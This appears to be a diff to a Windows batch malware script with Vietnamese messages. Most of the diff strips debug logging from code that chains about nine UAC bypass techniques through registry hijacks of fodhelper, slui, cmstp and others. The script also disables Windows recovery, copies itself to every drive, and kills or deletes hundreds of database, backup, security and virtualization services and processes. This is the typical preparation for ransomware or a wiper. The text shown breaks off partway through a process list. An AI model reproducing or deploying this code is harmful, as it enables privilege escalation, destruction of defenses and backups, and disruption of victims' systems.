@@ -26,51 +26,37 @@ set "r=%TEMP%\r.vbs"
 set "x=%TEMP%\d.bin"
 set "dp_script=%TEMP%\invincible.txt"
 set "dp_output=%TEMP%\dp_output.txt"
-echo %date% %time% - Variables initialized, f=!f! >> "%DEBUG_LOG%"
+echo %date% %time% - Variables initialized >> "%DEBUG_LOG%"
 goto :uac
 
 :uac
 echo %date% %time% - Entering UAC bypass section >> "%DEBUG_LOG%"
 set "_f=%~dpnx0"
-echo %date% %time% - Trying PowerShell elevation >> "%DEBUG_LOG%"
 powershell -c "Start-Process '%_f%' -Verb RunAs -WindowStyle Hidden" >nul 2>&1 && exit /b
-echo %date% %time% - Trying uac_fodhelper >> "%DEBUG_LOG%"
 call :uac_fodhelper & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_silentcleanup >> "%DEBUG_LOG%"
 call :uac_silentcleanup & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_ms_settings >> "%DEBUG_LOG%"
 call :uac_ms_settings & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_computerdefaults >> "%DEBUG_LOG%"
 call :uac_computerdefaults & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_slui >> "%DEBUG_LOG%"
 call :uac_slui & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_colorui >> "%DEBUG_LOG%"
 call :uac_colorui & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_cmstplua >> "%DEBUG_LOG%"
 call :uac_cmstplua & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_pcasvc >> "%DEBUG_LOG%"
 call :uac_pcasvc & if %errorlevel% equ 0 goto :elevated_ok
-echo %date% %time% - Trying uac_quickassist >> "%DEBUG_LOG%"
 call :uac_quickassist & if %errorlevel% equ 0 goto :elevated_ok
 echo %date% %time% - All UAC bypass failed >> "%DEBUG_LOG%"
-echo UAC bypass that bai. Vui long chay bang tay (Right-click -> Run as administrator)
+echo UAC bypass that bai. Vui long chay bang tay
 pause
 exit /b 1
 
 :uac_fodhelper
-echo %date% %time% - uac_fodhelper entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
-if %errorlevel% neq 0 echo %date% %time% - uac_fodhelper reg add failed, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f >nul 2>&1
 start /min fodhelper.exe
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_fodhelper exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_silentcleanup
-echo %date% %time% - uac_silentcleanup entered >> "%DEBUG_LOG%"
 set "_e=%~d0"
 if "%_e%"=="" set "_e=%SystemDrive%"
 reg add "HKCU\Environment" /v windir /t REG_SZ /d "%_e%\Windows" /f >nul 2>&1
@@ -78,11 +64,9 @@ schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" >nul 2>&1
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Environment" /v windir /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_silentcleanup exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_ms_settings
-echo %date% %time% - uac_ms_settings entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
 reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKCU\Software\Classes\ms-settings\shell\open" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
@@ -90,75 +74,62 @@ start computerdefaults.exe
 timeout /t 2 /nobreak >nul
 reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_ms_settings exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_computerdefaults
-echo %date% %time% - uac_computerdefaults entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
 start computerdefaults.exe
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_computerdefaults exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_slui
-echo %date% %time% - uac_slui entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
 reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /f >nul 2>&1
 start slui.exe
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Software\Classes\exefile\shell" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_slui exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_colorui
-echo %date% %time% - uac_colorui entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
 reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
 start /min colorcpl.exe
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_colorui exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_pcasvc
-echo %date% %time% - uac_pcasvc entered >> "%DEBUG_LOG%"
 reg add "HKCU\Environment" /v windir /t REG_EXPAND_SZ /d "C:\Windows\System32\pcadm.dll,%TEMP%\poc.dll" /f >nul 2>&1
 schtasks /run /tn "\Microsoft\Windows\Application Experience\PcaPatchDbTask" >nul 2>&1
 timeout /t 2 /nobreak >nul
 reg delete "HKCU\Environment" /v windir /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_pcasvc exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_quickassist
-echo %date% %time% - uac_quickassist entered >> "%DEBUG_LOG%"
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /v BrowserExecutableFolder /t REG_SZ /d "%TEMP%" /f >nul 2>&1
 start /min QuickAssist.exe
 timeout /t 3 /nobreak >nul
 reg delete "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /f >nul 2>&1
 taskkill /f /im QuickAssist.exe >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_quickassist exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 exit /b %errorlevel%
 
 :uac_cmstplua
-echo %date% %time% - uac_cmstplua entered >> "%DEBUG_LOG%"
 reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
 reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
 start /min cmstp.exe /au
 timeout /t 1 /nobreak >nul
 reg delete "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}" /f >nul 2>&1
 net session >nul 2>&1
-echo %date% %time% - uac_cmstplua exit, errorlevel=%errorlevel% >> "%DEBUG_LOG%"
 goto :stealth
 
 :elevated_ok
-echo %date% %time% - UAC bypass successful, continuing to stealth >> "%DEBUG_LOG%"
+echo %date% %time% - UAC bypass successful >> "%DEBUG_LOG%"
 goto :stealth
 
 :stealth
@@ -167,6 +138,7 @@ if "%~1"=="--elevated" goto :START_PROCESS
 start "" /Realtime "%~dpnx0" --elevated >nul 2>&1
 reagentc /disable >nul 2>&1
 powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { try { Copy-Item -Path '%~f0' -Destination (Join-Path $_.Root 'Backup_System.bat') -Force -ErrorAction Stop } catch {} }" >nul 2>&1
+
 :START_PROCESS
 echo %date% %time% - Killing processes >> "%DEBUG_LOG%"
 > "%TEMP%\kill.ps1" (
@@ -175,9 +147,24 @@ echo $critical = @('explorer','csrss','winlogon','services','lsass','svchost','S
 echo Get-Process ^| Where-Object {$processesToKill -contains $_.Name -and $critical -notcontains $_.Name} ^| Stop-Process -Force -ErrorAction SilentlyContinue
 )
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP%\kill.ps1"
-del "%TEMP%\DebugForBIOS.ps1" 2>nul
+del "%TEMP%\kill.ps1" 2>nul
+
 echo %date% %time% - Deleting services >> "%DEBUG_LOG%"
-powershell -WindowStyle Hidden -Command "$svc=@('XT800Service_Personal','SQLSERVERAGENT','SQLWriter','SQLBrowser','MSSQLFDLauncher','MSSQLSERVER','QcSoftService','MSSQLServerOLAPService','VMTools','VGAuthService','MSDTC','TeamViewer','ReportServer','RabbitMQ','AHS SERVICE','Sense Shield Service','SSMonitorService','SSSyncService','TPlusStdAppService1300','MSSQL$SQL2008','SQLAgent$SQL2008','TPlusStdTaskService1300','TPlusStdUpgradeService1300','VirboxWebServer','jhi_service','LMS','FontCache3.0.0.0','OSP Service','DAService_TCP','eCard-TTransServer','eCardMPService','EnergyDataService','UI0Detect','K3MobileService','TCPIDDAService','WebAttendServer','UIODetect','wanxiao-monitor','VMAuthdService','VMUSBArbService','VMwareHostd','vm-agent','VmAgentDaemon','OpenSSHd','eSightService','apachezt','Jenkins','secbizsrv','SQLTELEMETRY','MSMQ','smtpsvrJT','zyb_sync','360EntHttpServer','360EntSvc','360EntClientSvc','NFWebServer','wampapache','MSSEARCH','msftesql','SyncBASE Service','OracleDBConcoleorcl','OracleJobSchedulerORCL','OracleMTSRecoveryService','OracleOraDb11g_home1ClrAgent','OracleOraDb11g_home1TNSListener','OracleVssWriterORCL','OracleServiceORCL','aspnet_state','Redis','JhTask','ImeDictUpdateService','MCService','allpass_redisservice_port21160','Flash Helper Service','Kiwi Syslog Server','UWS HiPriv Services','UWS LoPriv Services','ftnlsv3','ftnlses3','FxService','UtilDev Web Server Pro','ftusbrdwks','ftusbrdsrv','ZTE USBIP Client Guard','ZTE USBIP Client','ZTE FileTranS','wwbizsrv','qemu-ga','AlibabaProtect','ZTEVdservice','kbasesrv','MMRHookService','IpOverUsbSvc','MsDtsServer100','KuaiYunTools','KMSELDI','btPanel','Protect_2345Explorer','2345PicSvc','vmware-converter-agent','vmware-converter-server','vmware-converter-worker','QQCertificateService','OracleRemExecService','GPSDaemon','GPSUserSvr','GPSDownSvr','GPSStorageSvr','GPSDataProcSvr','GPSGatewaySvr','GPSMediaSvr','GPSLoginSvr','GPSTomcat6','GPSMysqld','GPSFtpd','Zabbix Agent','BackupExecAgentAccelerator','bedbg','BackupExecDeviceMediaService','BackupExecRPCService','BackupExecAgentBrowser','BackupExecJobEngine','BackupExecManagementService','MDM','TxQBService','Gailun_Downloader','RemoteAssistService','YunService','Serv-U','EasyFZS Server','Rpc Monitor','OpenFastAssist','Nuo Update Monitor','Daemon Service','asComSvc','OfficeUpdateService','RtcSrv','RTCASMCU','FTA','MASTER','NscAuthService','MSCRMUnzipService','MSCRMAsyncService$maintenance','MSCRMAsyncService','REPLICA','RTCATS','RTCAVMCU','RtcQms','RTCMEETINGMCU','RTCIMMCU','RTCDATAMCU','RTCCDR','ProjectEventService16','ProjectQueueService16','SPAdminV4','SPSearchHostController','SPTimerV4','SPTraceV4','OSearch16','ProjectCalcService16','c2wts','AppFabricCachingService','ADWS','MotionBoard57','MotionBoardRCService57','vsvnjobsvc','VisualSVNServer','FlexNet Licensing Service 64','BestSyncSvc','LPManager','MediatekRegistryWriter','RaAutoInstSrv_RT2870','CobianBackup10','SQLANYs_sem5','CASLicenceServer','SQLService','semwebsrv','TbossSystem','ErpEnvSvc','Mysoft.Autoupgrade.DispatchService','Mysoft.Autoupgrade.UpdateService','Mysoft.Config.WindowsService','Mysoft.DataCenterService','Mysoft.SchedulingService','Mysoft.Setup.InstallService','MysoftUpdate','edr_monitor','abs_deployer','savsvc','ShareBoxMonitorService','ShareBoxService','CloudExchangeService','U8WorkerService2','CIS','EASService','KICkSvr','U8SmsSrv','OfficeClearCache','TurboCRM70','U8DispatchService','U8EISService','U8EncryptService','U8GCService','U8KeyManagePool','U8MPool','U8SCMPool','U8SLReportService','U8TaskService','U8WebPool','UFAllNet','UFReportService','UTUService','U8WorkerService1'); $svc = $svc | Sort-Object -Unique; foreach($s in $svc){sc.exe delete $s 2>$null}; $net=@('U8WorkerService1','U8WorkerService2','memcached Server','Apache2.4','UFIDAWebService','MSComplianceAudit','MSExchangeADTopology','MSExchangeAntispamUpdate','MSExchangeCompliance','MSExchangeDagMgmt','MSExchangeDelivery','MSExchangeDiagnostics','MSExchangeEdgeSync','MSExchangeFastSearch','MSExchangeFrontEndTransport','MSExchangeHM','MSSQL$SQL2008','MSExchangeHMRecovery','MSExchangeImap4','MSExchangeIMAP4BE','MSExchangeIS','MSExchangeMailboxAssistants','MSExchangeMailboxReplication','MSExchangeNotificationsBroker','MSExchangePop3','MSExchangePOP3BE','MSExchangeRepl','MSExchangeRPC','MSExchangeServiceHost','MSExchangeSubmission','MSExchangeThrottling','MSExchangeTransport','MSExchangeTransportLogSearch','MSExchangeUM','MSExchangeUMCR','MySQL5_OA'); $net = $net | Sort-Object -Unique; foreach($n in $net){net stop $n 2>$null}; $task=@('pg_ctl.exe','rcrelay.exe','SogouImeBroker.exe','CCenter.exe','ScanFrm.exe','d_manage.exe','RsTray.exe','wampmanager.exe','RavTray.exe','mssearch.exe','sqlmangr.exe','msftesql.exe','SyncBaseSvr.exe','oracle.exe','TNSLSNR.exe','SyncBaseConsole.exe','aspnet_state.exe','AutoBackUpEx.exe','redis-server.exe','MySQLNotifier.exe','oravssw.exe','fppdis5.exe','His6Service.exe','dinotify.exe','JhTask.exe','Executer.exe','AllPassCBHost.exe','ap_nginx.exe','AndroidServer.exe','XT.exe','XTService.exe','AllPassMCService.exe','IMEDICTUPDATE.exe','FlashHelperService.exe','ap_redis-server.exe','UtilDev.WebServer.Monitor.exe','UWS.AppHost.Clr2.x86.exe','FoxitProtect.exe','ftnlses.exe','ftusbrdwks.exe','ftusbrdsrv.exe','ftnlsv.exe','Syslogd_Service.exe','UWS.HighPrivilegeUtilities.exe','ftusbsrv.exe','UWS.LowPrivilegeUtilities.exe','UWS.AppHost.Clr2.AnyCpu.exe','winguard_x64.exe','vmconnect.exe','firefox.exe','usbrdsrv.exe','usbserver.exe','Foxmail.exe','qemu-ga.exe','wwbizsrv.exe','ZTEFileTranS.exe','ZTEUsbIpc.exe','ZTEUsbIpcGuard.exe','AlibabaProtect.exe','kbasesrv.exe','ZTEVdservice.exe','MMRHookService.exe','extjob.exe','IpOverUsbSvc.exe','VMwareTray.exe','devenv.exe','PerfWatson2.exe','ServiceHub.Host.Node.x86.exe','ServiceHub.IdentityHost.exe','ServiceHub.VSDetouredHost.exe','ServiceHub.SettingsHost.exe','ServiceHub.Host.CLR.x86.exe','ServiceHub.RoslynCodeAnalysisService32.exe','ServiceHub.DataWarehouseHost.exe','Microsoft.VisualStudio.Web.Host.exe','SQLEXPRWT.exe','setup.exe','remote.exe','setup100.exe','landingpage.exe','WINWORD.exe','KuaiYun.exe','HwsHostPanel.exe','NovelSpider.exe','Service_KMS.exe','WebServer.exe','ChsIME.exe','btPanel.exe','Protect_2345Explorer.exe','Pic_2345Svc.exe','vmware-converter-a.exe','vmware-converter.exe','vmware.exe','vmware-unity-helper.exe','vmware-vmx.exe','usysdiag.exe','PopBlock.exe','gsinterface.exe','Gemstar.Group.CRS.Client.exe','TenpayServer.exe','RemoteExecService.exe','VS_TrueCorsManager.exe','ntpsvr-2019-01-22-wgs84.exe','rtkjob-ion.exe','ntpsvr-2019-01-22-no-usrcheck.exe','NtripCaster-2019-01-08.exe','BACSTray.exe','protect.exe','hfs.exe','jzmis.exe','NewFileTime_x64.exe','2345MiniPage.exe','JMJ_server.exe','cacls.exe','gpsdaemon.exe','gpsusersvr.exe','gpsdownsvr.exe','gpsstoragesvr.exe','gpsdataprocsvr.exe','gpsftpd.exe','gpsmysqld.exe','gpstomcat6.exe','gpsloginsvr.exe','gpsmediasvr.exe','gpsgatewaysvr.exe','gpssvrctrl.exe','zabbix_agentd.exe','BackupExec.exe','Att.exe','mdm.exe','BackupExecManagementService.exe','bengine.exe','benetns.exe','beserver.exe','pvlsvr.exe','beremote.exe','RemoteAssistProcess.exe','BarMoniService.exe','GoodGameSrv.exe','BarCMService.exe','TsService.exe','GoodGame.exe','BarServerView.exe','IcafeServicesTray.exe','BsAgent_0.exe','ControlServer.exe','DisklessServer.exe','DumpServer.exe','NetDiskServer.exe','PersonUDisk.exe','service_agent.exe','SoftMemory.exe','BarServer.exe','RtkNGUI64.exe','Serv-U-Tray.exe','QQPCSoftTrayTips.exe','SohuNews.exe','Serv-U.exe','QQPCRTP.exe','EasyFZS.exe','HaoYiShi.exe','HysMySQL.exe','wtautoreg.exe','ispiritPro.exe','CAService.exe','XAssistant.exe','TrustCA.exe','GEUU20003.exe','CertMgr.exe','eSafe_monitor.exe','MainExecute.exe','FastInvoice.exe','SoftMgrLite.exe','sesvc.exe','ScanFileServer.exe','Nuoadehgcgcd.exe','OpenFastAssist.exe','FastInvoiceAssist.exe','Nuoadfaggcje.exe','OfficeUpdate.exe','atkexComSvc.exe','FileTransferAgent.exe','MasterReplicatorAgent.exe','CrmAsyncService.exe','CrmUnzipService.exe','NscAuthService.exe','ReplicaReplicatorAgent.exe','ASMCUSvc.exe','OcsAppServerHost.exe','RtcCdr.exe','IMMCUSvc.exe','DataMCUSvc.exe','MeetingMCUSvc.exe','QmsSvc.exe','RTCSrv.exe','pnopagw.exe','NscAuth.exe','Microsoft.ActiveDirectory.WebServices.exe','DistributedCacheService.exe','c2wtshost.exe','Microsoft.Office.Project.Server.Calculation.exe','schedengine.exe','Microsoft.Office.Project.Server.Eventing.exe','Microsoft.Office.Project.Server.Queuing.exe','WSSADMIN.EXE','hostcontrollerservice.exe','noderunner.exe','OWSTIMER.EXE','wsstracing.exe','MySQLInstallerConsole.exe','EXCEL.EXE','RtkAudioService64.exe','RAVBg64.exe','FNPLicensingService64.exe','VisualSVNServer.exe','MotionBoard57.exe','MotionBoardRCService57.exe','LPManService.exe','RaRegistry.exe','RaAutoInstSrv.exe','RtHDVCpl.exe','DefenderDaemon.exe','BestSyncApp.exe','ApUI.exe','AutoUpdate.exe','LPManNotifier.exe','FieldAnalyst.exe','TimingGenerate.exe','Detector.exe','Estimator.exe','FA_Logwriter.exe','TrackingSrv.exe','cbInterface.exe','EnterprisePortal.exe','ccbService.exe','monitor.exe','U8DispatchService.exe','dbsrv16.exe','sqlservr.exe','KICManager.exe','KICMain.exe','ServerManagerLauncher.exe','TbossGate.exe','iusb3mon.exe','MgrEnvSvc.exe','Mysoft.Config.WindowsService.exe','Mysoft.UpgradeService.UpdateService.exe','hasplms.exe','Mysoft.Setup.InstallService.exe','Mysoft.UpgradeService.Dispatcher.exe','Mysoft.DataCenterService.WindowsHost.exe','Mysoft.DataCenterService.DataCleaning.exe','Mysoft.DataCenterService.DataTracking.exe','Mysoft.SchedulingService.WindowsHost.exe','ServiceMonitor.exe','Mysoft.SchedulingService.ExecuteEngine.exe','AgentX.exe','host.exe','vsjitdebugger.exe','VBoxSDS.exe','mysqld.exe','TeamViewer_Service.exe','TeamViewer.exe','CasLicenceServer.exe','tv_w32.exe','tv_x64.exe','rdm.exe','SecureCRT.exe','SecureCRTPortable.exe','VirtualBox.exe','VBoxSVC.exe','VirtualBoxVM.exe','abs_deployer.exe','edr_monitor.exe','sfupdatemgr.exe','ipc_proxy.exe','edr_agent.exe','edr_sec_plan.exe','sfavsvc.exe','DataShareBox.ShareBoxMonitorService.exe','DataShareBox.ShareBoxService.exe','Jointsky.CloudExchangeService.exe','Jointsky.CloudExchange.NodeService.ein','perl.exe','java.exe','emagent.exe','TsServer.exe','AppMain.exe','easservice.exe','Kingdee6.1.exe','QyKernel.exe','QyFragment.exe','UserClient.exe','GNCEFExternal.exe','ComputerZTray.exe','ComputerZService.exe','ClearCache.exe','ProLiantMonitor.exe','bugreport.exe','GNWebServer.exe','UI0Detect.exe','GNCore.exe','gnwayDDNS.exe','GNWebHelper.exe','php-cgi.exe','ESLUSBService.exe','CQA.exe','Kekcoek.pif','Tinuknx.exe','servers.exe','ping.exe','TianHeng.exe','K3MobileService.exe','VSSVC.exe','Xshell.exe','XshellCore.exe','FNPLicensingService.exe','XYNTService.exe','EISService.exe','UFSoft.U8.Framework.EncryptManager.exe','yonyou.u8.gc.taskmanager.servicebus.exe','U8KeyManagePool.exe','U8MPool.exe','U8SCMPool.exe','UFIDA.U8.Report.SLReportService.exe','U8TaskService.exe','U8TaskWorker.exe','U8WebPool.exe','U8AllAuthServer.exe','UFIDA.U8.UAP.ReportService.exe','UFIDA.U8.ECE.UTU.Services.exe','U8WorkerService.exe','UFIDA.U8.ECE.UTU.exe','ShellStub.exe','U8UpLoadTask.exe','UfSysHostingService.exe','UFIDA.UBF.SystemManage.ApplicationService.exe','UFIDA.U9.CS.Collaboration.MailService.exe','NotificationService.exe','UBFdevenv.exe','UFIDA.U9.SystemManage.SystemManagerClient.exe','mongod.exe','SpusCss.exe','UUDesktop.exe','KDHRServices.exe','Kingdee.K3.PUBLIC.BkgSvcHost.exe','Kingdee.K3.HR.Server.exe','Kingdee.K3.Mobile.Servics.exe','Kingdee.K3.PUBLIC.KDSvrMgrHost.exe','KDSvrMgrService.exe','pdfServer.exe','pdfspeedup.exe','SufAppServer.exe','tomcat5.exe','Kingdee.K3.Mobile.LightPushService.exe','iMTSSvcMgr.exe','kdmain.exe','KDActMGr.exe','Kingdee.DeskTool.exe','K3ServiceUpdater.exe','Aua.exe','iNethinkSQLBackup.exe','auaJW.exe','Scheduler.exe','bschJW.exe','SystemTray64.exe','OfficeDaemon.exe','OfficeIndex.exe','OfficeIm.exe','iNethinkSQLBackupConsole.exe','OfficeMail.exe','OfficeTask.exe','OfficePOP3.exe','apache.exe','GnHostService.exe','HwUVPUpgrade.exe','Kingdee.KIS.UESystemSer.exe','uvpmonitor.exe','UVPUpgradeService.exe','KDdataUpdate.exe','Portal.exe','U8SMSSrv.exe','Ufida.T.SM.PublishService.exe','lta8.exe','UfSvrMgr.exe','AutoUpdateService.exe','MOM.exe','wscript.exe','cscript.exe'); $task = $task | Sort-Object -Unique; foreach($t in $task){taskkill /F /IM $t 2>$null}" >nul 2>&1
+> "%TEMP%\svc.ps1" (
+echo $ErrorActionPreference = 'SilentlyContinue'
+echo $svc = @('XT800Service_Personal','SQLSERVERAGENT','SQLWriter','SQLBrowser','MSSQLFDLauncher','MSSQLSERVER','QcSoftService','MSSQLServerOLAPService','VMTools','VGAuthService','MSDTC','TeamViewer','ReportServer','RabbitMQ','AHS SERVICE','Sense Shield Service','SSMonitorService','SSSyncService','TPlusStdAppService1300','MSSQL$SQL2008','SQLAgent$SQL2008','TPlusStdTaskService1300','TPlusStdUpgradeService1300','VirboxWebServer','jhi_service','LMS','FontCache3.0.0.0','OSP Service','DAService_TCP','eCard-TTransServer','eCardMPService','EnergyDataService','UI0Detect','K3MobileService','TCPIDDAService','WebAttendServer','UIODetect','wanxiao-monitor','VMAuthdService','VMUSBArbService','VMwareHostd','vm-agent','VmAgentDaemon','OpenSSHd','eSightService','apachezt','Jenkins','secbizsrv','SQLTELEMETRY','MSMQ','smtpsvrJT','zyb_sync','360EntHttpServer','360EntSvc','360EntClientSvc','NFWebServer','wampapache','MSSEARCH','msftesql','SyncBASE Service','OracleDBConcoleorcl','OracleJobSchedulerORCL','OracleMTSRecoveryService','OracleOraDb11g_home1ClrAgent','OracleOraDb11g_home1TNSListener','OracleVssWriterORCL','OracleServiceORCL','aspnet_state','Redis','JhTask','ImeDictUpdateService','MCService','allpass_redisservice_port21160','Flash Helper Service','Kiwi Syslog Server','UWS HiPriv Services','UWS LoPriv Services','ftnlsv3','ftnlses3','FxService','UtilDev Web Server Pro','ftusbrdwks','ftusbrdsrv','ZTE USBIP Client Guard','ZTE USBIP Client','ZTE FileTranS','wwbizsrv','qemu-ga','AlibabaProtect','ZTEVdservice','kbasesrv','MMRHookService','IpOverUsbSvc','MsDtsServer100','KuaiYunTools','KMSELDI','btPanel','Protect_2345Explorer','2345PicSvc','vmware-converter-agent','vmware-converter-server','vmware-converter-worker','QQCertificateService','OracleRemExecService','GPSDaemon','GPSUserSvr','GPSDownSvr','GPSStorageSvr','GPSDataProcSvr','GPSGatewaySvr','GPSMediaSvr','GPSLoginSvr','GPSTomcat6','GPSMysqld','GPSFtpd','Zabbix Agent','BackupExecAgentAccelerator','bedbg','BackupExecDeviceMediaService','BackupExecRPCService','BackupExecAgentBrowser','BackupExecJobEngine','BackupExecManagementService','MDM','TxQBService','Gailun_Downloader','RemoteAssistService','YunService','Serv-U','EasyFZS Server','Rpc Monitor','OpenFastAssist','Nuo Update Monitor','Daemon Service','asComSvc','OfficeUpdateService','RtcSrv','RTCASMCU','FTA','MASTER','NscAuthService','MSCRMUnzipService','MSCRMAsyncService$maintenance','MSCRMAsyncService','REPLICA','RTCATS','RTCAVMCU','RtcQms','RTCMEETINGMCU','RTCIMMCU','RTCDATAMCU','RTCCDR','ProjectEventService16','ProjectQueueService16','SPAdminV4','SPSearchHostController','SPTimerV4','SPTraceV4','OSearch16','ProjectCalcService16','c2wts','AppFabricCachingService','ADWS','MotionBoard57','MotionBoardRCService57','vsvnjobsvc','VisualSVNServer','FlexNet Licensing Service 64','BestSyncSvc','LPManager','MediatekRegistryWriter','RaAutoInstSrv_RT2870','CobianBackup10','SQLANYs_sem5','CASLicenceServer','SQLService','semwebsrv','TbossSystem','ErpEnvSvc','Mysoft.Autoupgrade.DispatchService','Mysoft.Autoupgrade.UpdateService','Mysoft.Config.WindowsService','Mysoft.DataCenterService','Mysoft.SchedulingService','Mysoft.Setup.InstallService','MysoftUpdate','edr_monitor','abs_deployer','savsvc','ShareBoxMonitorService','ShareBoxService','CloudExchangeService','U8WorkerService2','CIS','EASService','KICkSvr','U8SmsSrv','OfficeClearCache','TurboCRM70','U8DispatchService','U8EISService','U8EncryptService','U8GCService','U8KeyManagePool','U8MPool','U8SCMPool','U8SLReportService','U8TaskService','U8WebPool','UFAllNet','UFReportService','UTUService','U8WorkerService1')
+echo $svc = $svc ^| Sort-Object -Unique
+echo foreach($s in $svc){sc.exe delete $s 2^>$null}
+echo $net = @('U8WorkerService1','U8WorkerService2','memcached Server','Apache2.4','UFIDAWebService','MSComplianceAudit','MSExchangeADTopology','MSExchangeAntispamUpdate','MSExchangeCompliance','MSExchangeDagMgmt','MSExchangeDelivery','MSExchangeDiagnostics','MSExchangeEdgeSync','MSExchangeFastSearch','MSExchangeFrontEndTransport','MSExchangeHM','MSSQL$SQL2008','MSExchangeHMRecovery','MSExchangeImap4','MSExchangeIMAP4BE','MSExchangeIS','MSExchangeMailboxAssistants','MSExchangeMailboxReplication','MSExchangeNotificationsBroker','MSExchangePop3','MSExchangePOP3BE','MSExchangeRepl','MSExchangeRPC','MSExchangeServiceHost','MSExchangeSubmission','MSExchangeThrottling','MSExchangeTransport','MSExchangeTransportLogSearch','MSExchangeUM','MSExchangeUMCR','MySQL5_OA')
+echo $net = $net ^| Sort-Object -Unique
+echo foreach($n in $net){net stop $n 2^>$null}
+echo $task = @('pg_ctl.exe','rcrelay.exe','SogouImeBroker.exe','CCenter.exe','ScanFrm.exe','d_manage.exe','RsTray.exe','wampmanager.exe','RavTray.exe','mssearch.exe','sqlmangr.exe','msftesql.exe','SyncBaseSvr.exe','oracle.exe','TNSLSNR.exe','SyncBaseConsole.exe','aspnet_state.exe','AutoBackUpEx.exe','redis-server.exe','MySQLNotifier.exe','oravssw.exe','fppdis5.exe','His6Service.exe','dinotify.exe','JhTask.exe','Executer.exe','AllPassCBHost.exe','ap_nginx.exe','AndroidServer.exe','XT.exe','XTService.exe','AllPassMCService.exe','IMEDICTUPDATE.exe','FlashHelperService.exe','ap_redis-server.exe','UtilDev.WebServer.Monitor.exe','UWS.AppHost.Clr2.x86.exe','FoxitProtect.exe','ftnlses.exe','ftusbrdwks.exe','ftusbrdsrv.exe','ftnlsv.exe','Syslogd_Service.exe','UWS.HighPrivilegeUtilities.exe','ftusbsrv.exe','UWS.LowPrivilegeUtilities.exe','UWS.AppHost.Clr2.AnyCpu.exe','winguard_x64.exe','vmconnect.exe','firefox.exe','usbrdsrv.exe','usbserver.exe','Foxmail.exe','qemu-ga.exe','wwbizsrv.exe','ZTEFileTranS.exe','ZTEUsbIpc.exe','ZTEUsbIpcGuard.exe','AlibabaProtect.exe','kbasesrv.exe','ZTEVdservice.exe','MMRHookService.exe','extjob.exe','IpOverUsbSvc.exe','VMwareTray.exe','devenv.exe','PerfWatson2.exe','ServiceHub.Host.Node.x86.exe','ServiceHub.IdentityHost.exe','ServiceHub.VSDetouredHost.exe',